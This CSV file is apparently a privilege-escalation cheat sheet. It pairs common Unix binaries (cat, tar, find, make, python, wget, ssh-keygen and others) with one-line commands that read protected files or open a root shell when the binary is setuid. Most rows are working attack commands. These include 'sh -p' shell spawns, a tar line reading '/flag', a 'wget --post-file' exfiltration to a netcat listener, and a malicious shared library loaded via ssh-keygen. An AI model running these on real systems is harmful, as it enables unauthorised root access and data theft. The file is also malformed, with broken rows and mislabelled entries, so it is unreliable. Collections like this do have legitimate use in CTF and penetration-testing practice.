id,name,cmd,type,,
1,cat,cat '$FILE',File Read,,
2,more,more '$FILE',File Read,,
3,less,less '$FILE',File Read,,
4,tail,tail '$FILE',File Read,,
5,head ,head '$FILE',File Read,,
6,sort  ,sort -m  '$FILE',File Read,,
7,vim.basic,vim  '$FILE',File Read,, 
8,vim,vim  '$FILE',File Read,,
9,emacs-gtk,emacs  '$FILE',File Read,,
10,emacs ,emacs  '$FILE',File Read,,
11,nano,nano '$FILE',File Read,,
12,rev,rev '$FILE' | rev,File Read,,
13,od,od -An -c -w999 '$FILE',File Read,,
14,hexdump,hd '$FILE',File Read,,
15,hd,hd '$FILE',File Read,,
16,xxd,xxd '$FILE'| xxd -r,File Read,,
17,base32,base32 '$FILE' | base32  -d,File Read,,
18,base64,base64 '$FILE' | base64 -d,File Read,,
19,split,split '$FILE' pwnout;cat pwnoutaa; rm pwnoutaa -f,File Read,,
20,gzip,gzip -f '$FILE' -t,File Read,,
21,bzip2, bzip2 -c '$FILE' | bzip2 -d,File Read,,
22,zip ,zip pwnout.zip '$FILE';unzip -p pwnout.zip;rm -f pwnout.zip,File Read,,
23,tar,tar -c '$FILE'  | tar -xO;tar xf /flag -I '/bin/sh -c 'cat 1>&2'',File Read,,
24,x86_64-linux-gnu-ar,ar r '$FILE.ar' '$FILE'; ar p '$FILE.ar';rm -f '$FILE.ar',File Read,,
25,ar ,ar r '$FILE.ar' '$FILE'; ar p '$FILE.ar';rm -f '$FILE.ar',File Read,,
26,cpio,echo '$FILE' |cpio -o,File Read,,
27,genisoimage,genisoimage -sort '$FILE',File Read,,
28,env,env sh -p,Gain Root Access,,
29,find ,find . -exec /bin/sh -p \; -quit,Gain Root Access,,
30,make,COMMAND='/bin/sh -p';make -s --eval=$'x:\n\t-''$COMMAND',Gain Root Access,,
31,nice ,nice sh -p,Gain Root Access,,
32,timeout,timeout 7d sh -p,Gain Root Access,,
33,stdbuf,stdbuf -i0 /bin/sh -p,Gain Root Access,,
34,setarch,setarch $(arch) /bin/sh -p,Gain Root Access,,
35,watch,watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0',Gain Root Access,,
36,socat,socat stdin exec:'sh -p',Gain Root Access,,
37,whiptail,whiptail --textbox --scrolltext '$LFILE' 10 100,Gain Root Access,,
38,awk ,awk -v LFILE=$LFILE 'BEGIN { print 'DATA' > LFILE }',File Read,,
39,sed,sed -e '' '$LFILE',File Read,,
40,ed,ed '$FILE',File Read,,
41,chown,chown $(id -un):$(id -gn) $LFILE,File Read,,
42,chmod,chmod 6777 $LFILE,File Read,,
43,cp ,cp '$LFILE' /dev/stdout;cp  --no-preserve=mode,ownership  '$FILE' 'fileout',read file ,
44,mv,LFILE=file_to_write;TF=$(mktemp);echo 'DATA' > $TF;mv $TF $LFILE,read file and gain root access,,
45,,mv /bin/sh /bin/mv ;mv -p,,,
46,perl,perl -e 'exec '/bin/sh';',read file ,,
47,python,python -c 'import os; os.execl('/bin/sh', 'sh', '-p')',gain root access
48,bash,bash -p ,gain root access,,
49,date,date -f '$FILE',File Read,,
50,dmesg,dmesg -F '$FILE',File Read,,
51,wc,./wc --files0-from '$FILE',File Read,,
52,gcc,gcc -x c '$FILE',File Read,,
53,as ,as '$FILE',File Read,,
54,wget,TF=$(mktemp);chmod +x $TF;echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF;wget --use-askpass=$TF 0,Gain Root Access,,
55,,nc -l 1234   // terminal 1;wget --post-file='$FILE'  //terminal 2,File Read,,
56,ssh-keygen,cat '#include <unistd.h>,,,
void C_GetFunctionList(),,,,,
{,,,,,
  char *binaryPath = '/usr/bin/bash';,,,,,
  char *args[] = {binaryPath,'-p', NULL};,,,
  execv(binaryPath, args);,,,,
  return ;,,,,,
}'  > file.c,,,,,
$ gcc -c -Wall -Werror -fpic file.c,,,,,
gcc -shared -o file.so file.o,,,,,
ssh-keygen -D ./file.so,gain root access,,,,
